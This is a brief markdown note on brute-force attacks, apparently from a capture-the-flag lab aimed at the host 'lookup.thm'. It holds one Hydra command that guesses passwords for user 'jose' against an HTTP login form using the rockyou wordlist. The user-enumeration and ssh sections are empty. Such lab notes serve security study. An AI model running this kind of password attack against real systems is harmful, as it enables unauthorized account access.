# Brute Force

## User enumeration - error based



## Hydra to brute force password
```bash
# HTTP-post authentication
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V

# ssh

```